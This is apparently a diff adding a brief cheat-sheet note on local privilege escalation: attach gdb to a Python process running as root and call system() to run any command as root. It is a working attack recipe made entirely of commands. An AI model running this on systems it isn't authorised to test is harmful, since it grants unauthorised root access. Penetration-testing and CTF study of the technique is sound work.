@@ -1,0 +1,5 @@
+gdb + python process running as root
+
+ps aux - get pid of python process
+gdb -p [pid] 
+call (void)system("cmd") - cmd will be run as root
